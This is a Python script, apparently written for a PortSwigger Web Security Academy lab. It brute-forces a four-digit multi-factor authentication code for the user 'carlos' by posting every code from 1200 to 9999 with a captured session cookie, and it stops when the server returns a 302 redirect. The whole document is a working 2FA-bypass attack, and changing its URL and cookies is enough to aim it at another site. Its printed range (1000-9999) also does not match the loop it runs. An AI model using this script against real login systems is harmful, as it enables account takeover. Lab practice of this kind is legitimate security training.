import requests

# Replace with your authorized target URL
URL = "https://0a7200e603f7f00b80cdd5a1005600d4.web-security-academy.net/login2"

# Headers and cookies from your session
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Content-Type": "application/x-www-form-urlencoded",
}

cookies = {
    "session": "yJVe3AiCAainxhPpQmGnkvsgxws5Bxcg",
    "verify": "carlos"
}

print("[*] Starting sequential request loop (1000 - 9999)...")

# Loop through all 4-digit codes
for code in range(1200, 10000):
    data = {
        "mfa-code": str(code)
    }
    
    try:
        # allow_redirects=False prevents Python from automatically following the 302
        response = requests.post(
            URL, 
            headers=headers, 
            cookies=cookies, 
            data=data, 
            allow_redirects=False
        )
        
        # Check for the target 302 status code
        if response.status_code == 302:
            print(f"\n[+] Success! Found code: {code} (Status: 302)")
            print(f"[+] Location Header: {response.headers.get('Location')}")
            break
            
        # Simple progress update every 100 attempts
        if code % 100 == 0:
            print(f"[*] Checking range starting at {code}...", end="\r")
            
    except requests.exceptions.RequestException as e:
        print(f"\n[-] Connection error at code {code}: {e}")
        break
else:
    print("\n[-] Finished loop. No 302 status code was returned.")